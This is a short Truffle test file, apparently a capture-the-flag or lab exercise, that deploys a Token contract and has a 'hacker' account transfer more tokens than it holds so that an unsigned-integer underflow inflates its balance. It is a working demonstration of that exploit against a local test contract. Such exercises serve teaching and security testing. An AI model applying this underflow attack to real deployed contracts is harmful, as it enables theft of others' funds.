'use strict'

const {assert} = require('chai');
const Token = artifacts.require("Token");

contract('Token', async (accounts) => {

    let instance;
    
    const owner = accounts[1];
    const hacker = accounts[2];

    beforeEach( async () => {
    
        instance = await Token.new(21e+6, {
            from: owner
        });
        assert.equal(
            (await instance.totalSupply()).toNumber(),
            21e+6
        );
        
        await instance.transfer(hacker, 20, {
            from: owner
        });
        assert.equal(
            (await instance.balanceOf(hacker)).toNumber(),
            20
        );
    });

    it("uint should overflow", async () => {

        await instance.transfer(owner, 21, {
            from: hacker
        });        
    });

    afterEach( async () => {
        assert.isAbove(
            (await instance.balanceOf(hacker)).toNumber(), 
            20,
            "Hacker balance should be increased."
        );
    });

});